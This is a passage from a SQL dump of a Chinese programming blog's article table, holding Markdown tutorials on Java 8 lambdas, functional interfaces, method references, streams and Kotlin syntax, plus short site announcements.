final int money;\n	public AchieveMoney2(int money) {\n		this.money = money;\n	}\n	public void printMoney(Function<Integer,String> fn) {\n		System.out.println(\"我的存款:\"+ fn.apply(this.money));\n	}\n} \npublic class Main{\n	public static void main(String[] args) {\n		AchieveMoney am = new AchieveMoney(500);\n		Function<Integer,String> function = i -> new DecimalFormat(\"#,###\").format(i);\n		am.printMoney(function); \n		// 链式调用\n		// 顺序依次为compose -> apply -> andThen\n		// componse 执行方法前执行,e是apply时传入的参数\n		// 我的存款:250,000\n		am.printMoney(function.compose(e -> e * e));		\n		// andThen 执行方法后执行,s是apply返回值\n		// 我的存款:人民币500\n		am.printMoney(function.andThen(s -> \"人民币\" + s));\n		// 一起使用\n		// 我的存款:人民币250,000\n		am.printMoney(function.andThen(s -> \"人民币\" + s).compose(e -> e * e)); \n	}\n}\n```\n链式调用的两个方法compose和andThen\n1. compose,执行方法前执行,接收到的是apply时的参数\n2. andThen,执行方法后执行，接收到的时apply的返回值\n\n如果你还是看不懂，那就来个简单点的例子 \n```java\npublic class Main {\n	public static void main(String[] args) {\n		Function<Integer, Integer> origin = e -> e * 2;\n		Function<Integer, Integer> extra= e -> e * e;\n		// compose 先执行apply时的参数，后执行调用方法\n		// andThen 先执行调用方法，后执行apply的返回值\n		Integer apply = origin.compose(extra).apply(4);  \n		Integer apply2 = origin.andThen(extra).apply(4);  \n		// 4*4=16 -> 16*2=32\n		System.out.println(apply);// 32\n		// 4*2=8  -> 8*8=64\n		System.out.println(apply2);// 64\n	}\n}\n```\n上面的例子看懂了，再回头看那个存款的例子应该也能看懂了\n### 常用函数接口\n函数接口只有这一个Function<输入,输出>吗?，当然不止,还要好几种，我们列举一下\n\n接口 | 输入参数 |返回类型 | 说明 \n-| :-: |:-: |:-: |  \nPredicate< T > | T |boolean| 布尔值 断言 \nConsumer< T > | T | / | 只输入,消费数据  \nSupplier< T > | / | T | 只输出,生产数据\nUnaryOperator< T > | T | T | 输入输出相同，参数一个,一元函数\nBinaryOperator< T,T > | (T,T) | T | 输入输出相同，参数两个,二元函数\nFunction< T,R > | T | R | 输入T输出R的函数\nBinaryOpeartor< T,U,R > | (T,U) | R | 2个输入的Function\n\n我们全部来用一遍试试\n```java\npublic class Main {\n	public static void main(String[] args) {\n		// 布尔值断言\n		Predicate<Integer> predicate = i -> i>0;\n		System.out.println(predicate.test(2));\n		// 输入无输出,消费\n		Consumer<String> consumer = s -> System.out.println(s);;\n		consumer.accept(\"消费\");\n		// 输出无输入，生产\n		Supplier<String> supplier = ()-> \"生产\";\n		System.out.println(supplier.get());\n		// 输入输出相同,一元函数\n		UnaryOperator<String> unaryOperator = s -> s;\n		System.out.println(unaryOperator.apply(\"一元\"));\n		// 输入输出相同两个参数,二元函数\n		BinaryOperator<String> binaryOperator = (s1,s2) -> s1+s2;\n		System.out.println(binaryOperator.apply(\"前s\", \"后s\"));\n		// 输入输出不同,最常用\n		Function<Integer,String> function = (Integer i) -> Integer.toString(i);\n		System.out.println(function.apply(100));\n		// 输入输出不同，两个参数\n		BiFunction<Integer, String, String> BiFunction = (i,s) -> Integer.toString(i) + s;\n		System.out.println(BiFunction.apply(1, \"2\"));\n	}\n}\n```\n好了，到此，对函数接口应该有了一个大致的理解\n## 隐式的final和柯里化\n### 隐式final\n你看lambda表达式像不像是一个匿名函数,虽然一直说它是返回接口,\n```java\npublic static void main(String[] args) {\n	int weight = 5\n	// 只输入的函数接口 \n	Consumer<Integer> consumer = i ->System.out.println(i + weight);\n	consumer.accept(950)\n} \n```\n对Java有经验的应该知道匿名内部类,匿名内部类中的值必须是final的,也就是说不能改变的值,像这样\n```java\npublic static void main(String[] args) {\n	int weight = 5;\n	// 报错了,提示weight必须加final\n	weight = 6;\n	new Thread(new Runnable(){\n		public void run() {\n			System.out.println(weight);\n		}	\n	}).start();\n} \n```\nlambda表达式的weight能不能修改昵\n```java\npublic static void main(String[] args) {\n	int weight = 5\n	// 报错了,weight必须是final\n	weight = 6;\n	// 只输入的函数接口 \n	Consumer<Integer> consumer = i ->System.out.println(i + weight);\n	consumer.accept(950)\n} \n```\n然而都必须加final，表面上看是不用加final，其实还是得是final修饰  \n##### 为什么匿名内部类和lambda表达式中的值必须是final?  \n1. 这里要知道一件事,Java的传递都是值传递而不是引用传递,每次参数传递的都是一份*被拷贝的值副本*，就是说Java中只有*值传递*，没有引用传递.  \n如果外面的值改变了,但内部的值不会被改变,因为Java是值传递的，内部的值只是一开始外部值的一个拷贝,从此之后内外值没有关系了,比如改变了其中一个值，另一个值并不会收到任何的影响,这会引发一个严重的问题,数据不统一。\n2. 还有另一个原因闭包,闭包这个词在JavaScript中常见,但Java对闭包的支持并不完整  \nJava要求所有被内部类访问的局部变量都使用final修饰也是有其原因的对于普通的局部变量而言，它的作用域就停留在该方法内当方法执行结束后，该局部变量也随之消失但内部类则可能产生隐式的闭包，闭包将使得局部变量脱离它所在的方法继续存在\n\n### 闭包\n#### JavaScript的闭包\n这么讲很突兀,但对JavaScript高级知识有经验的应该知道闭包操作  \n先看看闭包是什么，看下面代码\n```javascript\nfunction fn() {\n	let num = 1	\n	return function(a) {\n		if (a != undefined) {\n			return a;\n		}\n		return num;\n	}\n}\nlet fnc = fn()   \nfnc()	  // 1\nfnc(2)	// 2\n```\n##### 可以看出fn方法它本身内部有一个变量num，它在fn方法中的内部,而当调用fn时返回的是另一个方法,变量num相当于被包在方法里面了没有出来,JavaScript中常用这种方法来限制变量的作用域，而且它和普通函数不同,这个num只在第一次调用时初始化了，这个函数将自己的一切*隐藏到了自己的内部*，外部根本无从知道这件事，这就叫闭包，但这种闭包操作如果没有使用好，会造成内存泄漏  \n##### 这种返回函数的函数被称为*高阶函数*  \n\n### 柯里化\n#### JavaScript的柯里化\n知道了高阶函数,那么就要了解柯里化这个概念,这个概念大部分在JavaScript的书籍中经常提及,Java中很少提及这个概念,因为除了编写框架之外很少会有人用到.  \n看下面这个例子了解一下什么叫做柯里化\n```javascript\nfunction add(a) {\n	var temp = function(b) {\n		return add(a + b)\n	}\n	temp.valueOf = temp.toString = function() {\n		return a\n	}\n	var ans = add(1)(2)(3)\n	console.log(ans) // 6\n}\n```\n#### lambda的柯里化\n可以看出柯里化的基本概念就是运算结束后返回一个函数,然后调用后又返回函数  \n用lambda表达式来实现这个add(1)(2)(3)的效果\n```java\npublic static void main(String[] args) {\n	Function<Integer,Function<Integer,Function<Integer,Integer>>> add;\n	add = x -> y -> z -> x + y + z; \n	System.out.println(add.apply(1).apply(2).apply(3)); // 6\n}\n```\n这样就相当完成了一个闭包柯里化，达成了上面js那样的效果，虽然不能够像js那样一直不停的调用  \n***\n上面的连续三个>可能会不能理解,缩短一个看看\n```java\npublic static void main(String[] args) {\n	// 输入了一个数字,返回了一个函数\n	Function<Integer,Function<Integer,Integer>> function = x -> y -> x + y;\n	// 第一次返回是一个Function,所以又可以调用				\n	System.out.println(function.apply(2).apply(3)); \n}\n// 你可以把它理解成这样的js代码\nfunction fn(a) {\n	return funtion)(b) {\n		return a + b; \n	}\n}\nconsole.log(fn(1)(2)) \n```\n# 结束 \n上面仅仅说明lambda表达式和函数接口的基本由来，但实际上以上的这些都是jdk8的基础,它们要搭配stream流程和方法引用才能发挥威力', 2, 0, 182, 0, 3, '2018-08-12 15:38:33', '2019-02-22 00:09:45', 0, 0);
INSERT INTO `article` VALUES (14, 1, '总结JDK8特性,方法引用和stream流编程', '2018/8/1534080203_1cef445c84a1f687f94db9b9537ce315.jpg', '# 前言\n上一篇的lamdba表达式和函数接口只能用作基础，实际上这些必须搭配方法引用和stream流编程才能实现,注意,stream流编程基本完全替代了以前的循环遍历,现在大家遍历都用stream流编程,所以非常非常非常重要.\n## 方法引用\n### 概念\n##### 什么是方法引用,方法引用就是引用方法咯  \n```java\npublic class Main {\n	public static void main(String[] args) {\n		// 这是lambda的方式\n		Consumer<String> consumer1= (s) -> System.out.println(s);\n		consumer1.accept(\"data\");\n		// 这是方法引用的方式\n		Consumer<String> consumer2 = System.out::println;\n		consumer2.accept(\"data\");\n	}\n}\n```\n##### 方法引用最关注的是什么?名字什么的都不重要,它只关心*输入和输出*\n##### System.out.println(s);打印语句只要求输入一个参数来打印,它不输出返回值,所以用Consumer就可以用接收这种格式的方法,引用语法就是System.out::println\n\n### 方法引用\n引用一条打印语句没什么意义，我们需要引用某个类的方法  \n方法又有静态方法和非静态方法，我们先看静态方法\n#### 静态方法的引用\n```java\npublic Cell {\n	private String name = \"血小板\";\n	private int count = 100;\n	public static void todo(Cell cell) {\n		 System.out.println(cell + \"止血\");\n	}\n	@Override\n	public String toString() {\n		return this.name;\n	}\n}\npublic class Main {\n	public static void main(String[] args) {\n		// 静态方法的引用\n		Consumer<A> consumer2 = Cell::todo;\n		consumer2.accept(new Cell());// 血小板止血\n	}\n}\n```\n上面的代码应该都容易看懂,静态方法依靠类名::方法进行引用，上面打印的应该是血小板止血\n#### 非静态方法的引用\n非静态方法的引用*可以用类名也可以用实例*,先使用实例\n```java\npublic Cell {\n	private String name = \"血小板\";\n	private int count = 100;\n\n	public int incr(int count) {\n		System.out.println(cell + \"新增了\"+count);\n		this.count = count;\n		return this.count;\n	}\n	@Override\n	public String toString() {\n		return this.name;\n	} \n}\npublic class Main {\n	public static void main(String[] args) {\n		// 非静态方法的实例引用 \n		Cell cell = new Cell();\n		// 观察incr方法的输入和输出，发现都是Integer，所以可以用UnaryOperator \n		// 注意用的是实例引用,而不是类名\n		UnaryOperator<Integer> unaryOperator = cell::incr;\n		System.out.println(unaryOperator.apply(100)); // 血小板新增了100，返回后又打印了100 \n 	}   \n} \n```\n#### 隐式this\n非静态方法引用类名之前，得知道JDK的隐式this\n```java\npublic int incr(int count) {\n	System.out.println(cell + \"新增了\"+count);\n	// 为什么这里可以用this\n	this.count = count;\n	return this.count;\n}\n```\n##### 为什么非静态方法里面可以用this来指代调用该方法的对象?\n因为调用方法的对象会被JDK隐式的放到非静态方法的第一个参数，名叫this,从编译的文件中可以看到这个操作，就像构造器中super()一样是个隐式操作   \n所以incr方法实际编译后是这样的\n```java\npublic int incr(Cell this,int count) {\n	System.out.println(cell + \"新增了\"+count);\n	// 为什么这里可以用this\n	this.count = count;\n	return this.count;\n}\n```\n但在IDE中是看不到第一个参数this的，你可以显式的写在方法的第一个参数中,即使你调用的方法只有一个参数也不会报错\n```java\npublic int incr(Cell this,int count) {\n	System.out.println(cell + \"新增了\"+count);\n	this.count = count;\n	return this.count;\n} \n\npublic static void main(String[] args) {\n	// 非静态方法的引用\n	Cell cell = new Cell();\n	cell.incr(100)// 并不会报错 \n}  \n```\n知道了隐式this，就知道应该如何用类名去方法引用了\n```java\npublic int incr(Cell this,int count) {\n	System.out.println(cell + \"新增了\"+count);\n	this.count = count;\n	return this.count;\n}\npublic static void main(String[] args) {\n	// 非静态方法使用类名引用\n	BiFunction<Cell,Integer,Integer> bigFn= Cell::incr;\n	bigFn.apply(new Cell(), 100); \n} \n```\n因为一个参数是实例对象，所以依靠类名引用你必须给第一个参数实例对象，否则没有实例对象又怎么能调实例的方法昵\n#### 构造器引用\n构造器也是方法，所以也可以引用，注意一个误区,*构造器不是创建实例的*,真正创建实例对象的是*new关键字*\n```java\nclass Cell{\n	// 无参的构造器\n	public Cell() {\n	\n	}\n}\npublic static void main(String[] args) {\n		// 无参的构造器\n		Supplier<Cell> supplier = Cell::new;\n		System.out.println(\"new了一个对象\"+supplier.get());\n} \n```\n```java\nclass Cell{\n	private String name = \"血小板\";\n	// 无参的构造器\n	public Cell(String name) {\n		this.name = name\n	}\n}\npublic static void main(String[] args) {\n		// 带参数的构造器引用\n		Function<String,Cell> function = Cell::new;\n		System.out.println(\"new了一个对象\"+function.apply(\"红细胞\"));\n} \n```\n\n## 简单了解stream流\nJDK8的重头戏来了，它改变了~~中国~~Java  \n先说下概念，这玩意是什么东西,stream是一个*高阶迭代器*,*迭代器*,*迭代器*,可以说它是处理一个数据结构，而不是仅仅一个集合。\n### 快速了解\n迭代分成*外部迭代*和*内部迭代*，别被这种专业名词恶心到,其实外部迭代就是你自己干的,内部迭代就是API帮你干的，你就是调了下它的API而已,直接举个栗子\n```java\npublic static void main(String[] args) {\n	int[] nums= {1,2,3};\n	// 传统外部迭代，这都是你自己干的，你自己写的求总数的逻辑\n	int sum = 0;\n	for (int i : nums) {\n		sum += i\n	}\n	System.out.println(\"总数:\"+ sum);\n	// stream内部迭代，你没写逻辑，你仅仅只是调用了一下API\n	int sum2 = IntStream.of(nums).parallel().sum();\n	System.out.println(sum2);\n}\n```\n看上去简单很多，因为逻辑不要你写,你只要调用下API就行了。  \n也许会觉得没什么用,我自己照样能写出这逻辑，干嘛要调它这API，我还得记这API  \n原因有两个\n1. 它很简洁，舒服\n2. 现在数据只有1,2,3，如果是是3亿的数据昵?，仅仅凭上面那种简单的求总和逻辑很明显性能不达标,因为是串行单线程的，只能慢慢计算\n3. 除非你自建线程池，把3亿数据拆分几万份，分别开启一个线程运算，最后进行合并,这可不好做\n4. 上面那个parallel()意思是开启*并行计算*，stream运算sum()时会把超过一定量的数据拆分给其他线程一同运算，最后进行数据合并  \n\n### 三部分概述\n所以stream流很强大，必须要会\n再来个栗子  \n```java\npublic static void main(String[] args) {\n	List<Integer> list = new ArrayList();\n	list.add(1);list.add(2);list.add(3);\n	// 根据原来的集合重新获取集合,如js中的arr.map那样\n	List<Integer> newData = list.stream().map( num -> \n		num * 2 \n	).collector(Collectors.toList())\n	// forEach遍历 \n	list.stream().forEach(num -> {\n		System.out.println(num); // 2 4 6\n	})\n} \n```\n上面代码看不懂没关系,后面会慢慢说明  \n我们先把第一个代码拆成三部分\n1. stream() 创建部分\n2. map() 中间部分,我们在中间部分进行操作，把每个数乘以2\n3. collect(Collectors.toList()) 终止操作，map中的新结果返回为一个List\n\n注意,中间部分可以有多个操作,比如排序,去重之类的,每次运行处理完一个中间部分操作后*返回一个新的stream*,所以又可以进行中间操作或者终止操作,这叫*链式操作*，了解jQuery的应该知道什么叫链式操作  \n举个栗子\n```java\n// sorted,distinct,map都是中间操作，每次返回一个stream又可以操作,一直...的调用\nList<Integer> newData = list.stream().sorted().distinct().map( num -> \n	num * 2 \n).collector(Collectors.toList())\n// jQuery中\n$(\'#nav\').addClass(\'show\').siblings().removeClass(\'show\')\n```\n你可以把它当成每次调用执行时返回调用者  \n注意,只要你没调用*终止操作方法*就可以一直调用中间操作的部分  \n##### 很明显collect(Collectors.toList())是一个终止操作，它要返回一个把经过中间操作处理后的数据新建为一个List了  \n \n## 创建,中间,终止\n下面来详解三个部分的每个部分  \n创建,中间,终止\n### 创建部分\n类型| 相关方法 \n-|-|  \n集合 | Collection.stream/.parallelStream |\n数组 | Arrays.stream |  \n数字 | IntStream/LongStream LongStream.of/.range/.rangeClosed |\n自定义 | Stream.generate/.iterate |\n\n\n来看看每个创建部分的操作和意思\n```java\npublic static void main(String[] args) {\n	// 从集合创建\n	List<String> list = new ArrayList();\n	// 串行流\n	list.stream();\n	// 并行流\n	list.parallelStream(); \n\n	// 从数组创建\n	Arrays.stream(new int[]{1,2,3});\n\n	// 从数字创建\n	IntStream.of(1,2,3);\n	// 1-100的创建 包含100\n	LongStream.rangeClosed(1, 100);\n	// 1-99的创建 不包含100\n	LongStream.rangeClosed(1, 100);\n	// 生成随机数,limit指定生成数量\n	new Random().ints().limit(10); \n\n	// 自定义\n	Random random = new Random();\n	// 自己创建自己想要的类型的流,limit指定生成数量\n	Stream.generate(() -> random.nextInt()).limit(20);\n	// 自己给出一个种子值，第二个参数接收种子值并按一定规律生成数据,limit指定生成数量\n	Stream.iterate(1, item -> item + 1).limit(10); \n}\n```  \n上面的注释应该很好懂，开始下一个部分\n### 中间部分\n类型| 相关方法 \n-|-|  \n有状态操作 | distinct | \n | sorted | \n | limit |\n | skip | \n-----| ---- |  \n无状态操作 | map |\n | flatMap |  \n | filter | \n | peek | \n | unordered |\n\n \n#### 有状态和无状态的区别\n1. 有状态操作,我现在迭代操作的元素和前面几个后面几个*有关系*  \n2. 无状态操作,我现在迭代操作的元素和其他的*没有关系*  \n\n由于中间部分操作需要很多的数据代码,这里就不给出具体代码，只将每个操作的具体意思记录  \n#### 有状态操作\n1. distinct 去重,调用后开启,它的去重依据是对象的equals和hashCode,你可以重写对象这两个方法来制定你的去重标准\n2. sorted 排序,调用后开启,它可以获取一个Comparator比较器参数作为排序的标准,你也可以让对象实现Comparable接口重写compareTo方法来制定排序标准，个人推荐第一种，修改对象本身不建议\n3. limit 取出数量,不获取所有的对象,只获取一部分时使用\n4. skip 跳过数量,不从头开始获取，获取指定数量之后的对象 \n\n#### 无状态操作\n1. map 遍历的是A对象集合，A对象下有个id属性，我不要整个A对象我只需要所有A对象的id，组成一个id列表，适用于用id列表去数据库查询对象的场景，很常用\n2. flatMap 遍历的是A对象集合，A对象下有个集合属性AA.我不要A对象,我需要所有A对象里的AA集合,组成AA列表，适用于两重集合的场景\n3. filter 过滤,遍历的是A对象集合,A对象里有个type属性,我只要type属性=2的A对象,其他的type值A对象我都不要,适用于拆分集合场景\n4. peek 像forEach一样遍历,但它是中间操作，你可以在遍历中对每个A对象做一些事情,记住,它是中间操作,你必须调用终止操作,它才会被执行，适用场景很少,一般都用终止操作forEach代替它\n5. unordered 并行流，它会打乱集合元素的顺序，调用后直接开启,，它开启了线程池拆分了集合数据,整理后直接合并，没有把顺序恢复,适用场景在不关心集合元素排序时\n6. parallel 并行流，和unordered一样会打乱元素顺序，一般遍历数字id的时候会开启它\n7. sequential 串行流,可以从并行流改回到串行流,\n\n##### parallel和sequential主要是改变了stream流Head头的并行标志,并行标志以最后一次为准，Head头是stream的运行机制之一 \n \n#### 运行机制 \n##### 简单说明一下运行机制,stream流里面有一个sourceStage指向header属性,所有的操作都是链式调用,一个元素只迭代一次,每一次中间操作返回一个处理后的新的stream。parallel和sequential 这两个操作不创建流，只修改head的并行标志,header头就是stream链式调用的实现  \n### 终止部分\n类型| 相关方法 \n-|-|  \n短路操作 | findFirst/findAny | \n | allMatch/anyMatch/noneMatch |   \n-----| ---- |\n非短路操作 | forEach/forEachOrdered |\n | collect |  \n | toArray | \n | reduce | \n | min/max/count|\n\n#### 短路操作和非短路操作区别\n1. 短路操作，不需要等待所有元素迭代完毕就可以返回结果  \n2. 非短路操作，等待所有元素迭代完毕后返回结果 \n \n#### 短路操作  \n1. findFirst 获取第一个元素\n2. findAny 随便获取一个元素\n3. allMatch 所有元素的某个属性满足某个条件,比如全要性别男\n4. anyMatch 至少有一个元素的某个属性满足某个条件,比如只要有一个性别男就行\n5. noneMatch 所有元素的某个属性不满足某个条件，比如一个性别男都不要\n6. xxxMatch返回的都是一个boolean值，条件是否满足\n\n#### 非短路操作\n1. forEach 遍历\n2. forEachOrdered 在开启中间操作parallel后使用,可以保证parallel并行合并后恢复原有的元素顺序\n3. collector 将遍历得到的结果转换为集合，像collector(Collectors.toList())这样\n4. toArray 将遍历得到的结果转换为数组\n5. reduce 第一个参数是默认值,第二参数是一个二元函数接口,处理本次元素和下一个元素的关系\n6. max 最大的对象,它接收一个Comparator比较器作为比较依据,也可以直接使用lambda表达式简化,两个参数分别是本次和下次元素对象\n7. min 最小的对象，和max一样接收一个Comparator比较器\n8. count 长度，返回结果的长度,和list.size()是一个意思\n\n```java\npublic static void main(String[] args) {\n	List<String> data = new ArrayList();\n	data.add(\'a1\');data.add(\"b2\");data.add(\"c3\");\n	String str = \"HELLO\";\n	// forEach\n	data.forEach(item -> {\n		System.out.println(item);// a1 b2 c3\n	})\n	// forEachOrdered\n	// 与parallel并行流一起使用时会保证合并数据顺序恢复\n	str.chars().parallel().forEachOrdered(i -> System.out.println(i)); \n	// collector收集器,将遍历得到的结果转换为集合，像collector(Collectors.toList())这样,还可以做额外的处理\n	List<String> list = data.stream().map( item -> item.substring(0, 1)).collect(Collectors.toList()); \n	// toArray,变为数组\n	Object[] array = list.stream().toArray();\n	// reduce\n	// 第一个参数是结果默认值,第二参数是一个二元函数接口,处理本次元素和下一个元素的关系\n	// 计算元素的字符串总长度\n	Integer reduce = list.stream().map(s -> s.length()).reduce(0,(s1,s2) -> s1 + s2);\n	// count 长度，返回结果的长度,和list.size()是一个意思\n	// max 最大的对象,它接收一个Comparator比较器作为对象比较依据,也可以直接使用lambda表达式简化,两个参数分别是本次和下次元素对象\n	// min 最小的对象，和max一样接收一个Comparator比较器 \n	long count = list.stream().count();\n	list.stream().max((s1,s2) -> s1.length() - s2.length()).get();\n	list.stream().min((s1,s2) -> s1.length() - s2.length()).get();\n}\n```\n### 惰性求值\n##### 一般都会觉得操作步骤是这样的: 创建部分->中间部分..->终止部分  \n##### 如果我不执行终止操作那它应该会运行中间部分,但是其实不会。  \n*没有调用终止操作的话它是不会执行的*  \n这里就是stream流的一个概念,*惰性求值*，它只是一个概念理论，不是要我们自己操作的.\n1. 惰性求值:它先做了一个方法的引用\n2. 在终止操作没有调用的情况下，中间操作都不会执行,比如上面没有调用collect(Collectors.toList())的话，那么.sorted().distinct().map()都不会被执行，即使你在里面写了逻辑代码也不会被执行 \n\n## 收集器\n##### collect是用的最多的，它的参数是一个Collectors,被称为收集器，它除了可以转换集合还可以做一些额外需求\n### 转换集合\n```java\npublic static void main(String[] args) {\n	List<User> data = new ArrayList();\n	// 这种方式编译后会多生成一个lambda$0这样的函数\n	List<String> collect1 = data.stream().map(item -> item.getName()).collect(Collectors.toList());\n	// 这种方法引用的方式编译后不会多生成函数\n	// 用方法引用更加的专业\n	List<String> collect2 = data.stream().map(User::getName).collect(Collectors.toList());\n}\n```\n#### 转换集合类型\n```java\npublic static void main(String[] args) {\n 	// 转换类型\n	TreeSet<String> treeSet = data.stream().map(User::getName).collect(Collectors.toCollection(TreeSet::new));\n}\n```\n#### 统计汇总的信息\n```java\npublic static void main(String[] args) {\n 	// 统计汇总信息\n		IntSummaryStatistics iss = data.stream().collect(Collectors.summarizingInt(User::getAge));\n		// 它会打印这些对象年龄的汇总信息\n		// 元素数量,年龄总数,年龄最小值,年龄最大值,平均值\n		System.out.println(iss); \n}\n```\n#### 分组\n```java\npublic static void main(String[] args) {\n	// 将相同年龄的用户存放在一起\n	// 像这样的数据结构\n	/*{\n			1: [[..],[...],[...]]\n			2: [[..],[...],[...]]\n			3: [[..],[...],[...]]\n	}*/ \n 	Map<Integer, List<User>> collect = data.stream().collect(Collectors.groupingBy(User::getAge));	\n}\n```\n```java\npublic static void main(String[] args) {\n	// 将相同性别的用户存放在一起\n	// 像这样的数据结构\n	/*{\n			true: [[...],[...],[...]]\n			false: [[...],[...],[...]]\n	}*/ \n	Map<Boolean, List<User>> map = data.stream().collect(Collectors.partitioningBy( u -> u.isGender() == true));	  \n}\n```\n#### 收集器可以嵌套\n```java\npublic static void main(String[] args) {\n	// 男女分块数据的总数，收集器嵌套\n	// 还可以额外嵌套求其他数值\n	Map<Boolean, Long> collect3 = data.stream().collect(Collectors.groupingBy(User::isGender,Collectors.counting()));\n}\n```', 0, 0, 127, 0, 1, '2018-08-12 21:47:37', '2019-02-22 00:10:07', 0, 0);
INSERT INTO `article` VALUES (15, 1, '博客上线测试', '2018/8/1534323001_db4feeaded993080b5ef03cf3121f42b.jpg', '从7月8日开始搭建博客,至8月24日完成预想功能,本博客前台由React+SpringBoot搭建  \n博客源码 https://github.com/tuwq/blog', 8, 0, 138, 0, 0, '2018-08-15 16:52:37', '2019-02-23 19:04:18', 0, 0);
INSERT INTO `article` VALUES (16, 1, '交换友链', '2018/8/1535013644_04d6923d0ad2cbd965b507b18cc5b36f.jpg', '# 此贴用于交换友链\n ### 申请格式 \n1. 昵称: 纤月\n2. 地址(首页): https://blog.tuwq.cn\n3. 头像地址: https://blog.tuwq.cn/static/image/bloglogo.jpg  \n4. 描述: 愿你永远保持热血与中二\n\n留言板及友链申请页面暂未制作', 8, 1, 300, 0, 0, '2018-08-23 15:45:58', '2019-10-28 17:38:36', 0, 0);
INSERT INTO `article` VALUES (17, 1, 'Kotlin语法', '2018/8/1535197673_0072Vf1pgy1foxk3qdi4cj31kw0w0kh2.jpg', '# 记录kotlin语法\n## HelloWord\n```kotlin\nfun main(args: Array<String>) {\n	println(\"HelloWorld\")\n}\n```\n## 基本类型 \n```kotlin\n// Boolean\nval b1: Boolean = true\nval b2: Boolean = false\n// Number\nval maxInt: Int = Int.MAX_VALUE\nval maxLong: Long = Long.MAX_VALUE\nval maxDouble: Double = Double.MAX_VALUE\nval maxShort: Short = Short.MAX_VALUE\nval maxByte: Byte = Byte.MAX_VALUE\n// Char\nval c1: Char = \'0\'\nval c2: Char = \'我\'\nval c3: Char = \'\\u000f\'\n// String\nval string: String = \"HelloWorld\"\nval fromChars: String = String(charArrayOf(\'H\',\'W\'))\n\nfun main(args: Arrays<String>) {\n    // 相当于Java中的equals\n    println(string == fromChars)\n    // 比较内存地址\n    println(string === fromChars)\n    val arg1: Int = 0\n    val arg2: Int = 1\n    // 字符串模板\n    println(\"$arg1 + $arg2 = ${arg1 + arg2}\")\n    val sayHello: String = \"Hello \\\"Kotlin\\\"\"\n    // 特殊符号\n    val salary = 1000\n    println(\"$$salary\")\n    // 直接转义字符串\n    val rawString = \"\"\" \\n \\t \"\"\".trimIndent()\n}\n```\n左变量名右类型的定义方式有一些反人类\n## 空类型\n```kotlin\n// 可以返回空\nfun getName():String? {\n	return null\n}\nfun getName2():String? {\n	return \"HelloWorld\"\n}\nfun main(args: Array<String>) {\n	// 如果获取得是空执行return\n	val name:String = getName()?return\n	println(name.length)\n	// 可能是空字符串\n	val value:String?=getName2()\n	// !!告诉编译器保证它不是空\n	println(value!!.length)\n}\n```\n有kotlin的特性会避免空针犯错\n## 智能类型转换\n```java\nfun main(args:Array) {\n	// 实际获得子类\n	val parent:Parent = Child()\n	// 相当于Java的instanceof\n	if (parent is Child) {\n		// 判断后调用方法不需要强转成Child了\n		// Java的话必须强转成Child才能调用方法\n		println(parent.name)\n	}\n	// 实际获得父类\n	val parent2:Parent = Parent()\n	// as相当于Java的强转(Child)parent2\n	// as?如果出现转换错误异常返回空\n	// Child?可以接收空\n	val child:Child? = parent2 as? Child\n	println(child) // null\n}\n```\n## 区间\n```kotlin\nval rang:IntRange = 0..1024	// 0-1024\nval rang2:IntRange = 0 util 1024 // 0-1023\nval rang3:IntRange = 0..-1	// 空\n\nfun main(args: Array<String>) {\n	println(rang3.isEmptry()) // true\n	// 以下两种方式都是判断该数字是否存在于区间内\n	println(rang.contains(500))\n	println(500 in rang)\n	for (i in rang2) {\n		// 打印区间内每个数 0...1023\n		print(\"$i, \')\n	}\n}\n```\n## 数组\n```kotlin\nval arrayOfInt:IntArray = intArrayOf(1,3,5,7)\nval arrayOfChar: CharArray = charArrayOf(\'H\',\'W\')\nval arrayOfString: Array<String> = arrayOf(\"技术宅\",\"拯救\",\"世界\")\nval arrayOfObj: Array<Child> = arrayOf(Child(),Child(),Child()) \n\nfun main(args:Array<String>) {\n	println(arrayOfInt.size) // 4\n	for (i in arrayOfInt) {\n		println(i) // 1,3,5,7\n	}\n	println(arrayOfString[1]) // 拯救\n	println(arrayOfChar.joinToString(\"\")) // HW\n	println(arrayOfInt.slice(0..2)) // [1,3,5]\n}\n```\n## 变量，常量\n```kotlin\n// 添加const变为编译期常量,否则val的值可以通过反射修改\nconst val FINAL_HELLO_WORLD:String = \"Final_HelloWorld\"\n// 变量\nvar helloWorld:String = \"HelloWorld\"\n// 编译推导类型\n// 不用指定明确类型，这点像js一样\nval s1 = \"Hello\" // string\nvar s2 = \"A\"+5 // string\nval i = 5 // int\n```\n## 函数\n```kotlin\n// 没有返回时返回Unit，相当于Java里的Void\nfun main(args:Array<String>):Unit {\n    val arg1 = args[0].toInt()\n    val arg2 = args[1].toInt()\n    println(\"$arg1 + $arg2 = ${sum(arg1,arg2)}\")\n    println(sum3(arg1,arg2))\n} \n// 常规写法\nfun sum(arg1:Int,arg2:Int):Int {\n    return arg1 + arg2\n}\n// 当只有返回结果时\nfun sum2(arg1:Int,arg2:Int) = arg1 + arg2\n// 引用函数\nval sum3 = fun(x:Int):String {\n    return x.toString()\n}\n```\n## 参数\n```kotlin\n// 长参数，像Java中的...一样，不过有关键字可以放在任意位置\nfun main(vararg args:String) {\n    val array = intArrayOf(1,2,3,4,5)\n    // 两种方式都一样\n    // 长参数后面的参数要指定形参名称\n    hello(4.0,1,2,3,4,5,string = \"Hello\")\n    hello(4.0,*array,string = \"Hello\")\n    // 只放入两个参数\n    hello(ints = *array,string = \"Hello\")\n}\nfun hello(double:Double = 3.0,vararg ints:Int,string:String) {\n    // lambda表达式的遍历方式\n    ints.forEach{\n    	println(it)\n    }\n    println(string)\n}\n```\n## 延迟初始化\n```kotlin\nclass A {\n    var a = 0\n    // 延迟初始化,var用lateinit,val用by lazy\n    lateinit var b:String\n    val c:X by lazy {\n       println(\"init X\")\n       // 最后一行是返回值\n       X()\n    }\n}\n```\n## 自定义重写运算符关键字\n自定义关键字，一般用于DSL中\n```kotlin\nclass A {\n	// 添加infix说明是运算符函数\n	infix fun on(any:Any):Boolean {\n		return false\n	}\n}\nclass B\n// 使用自定义的运算符关键字\nfun main(args:Array<String>) {\n	if (A() on B()) {\n	}\n}\n```\n重写运算符\n```kotlin\nclass Complex(var a:Double,var b:Double){\n	// operator重写运算符的关键字\n	// plus重写 +\n	operator fun plus(other:Complex){\n		return Complex(a+other.a, b+other.b)\n	}\n	// 重写toString\n	override fun toString(): String {\n        return \"$a___ $b\"\n    }\n }\nfun main(args: Array<String>) {\n    val c1 = Complex(5.0,3.0)\n    val c2 = Complex(5.0,3.0)\n    println(c1 + c2) // 10__6\n}\n```\n可重载\n```kotlin\noperator fun plus(int:Int):Complex {\n    return Complex(a+ int, b)\n}\noperator fun plus(str:String): Double {\n    return a + 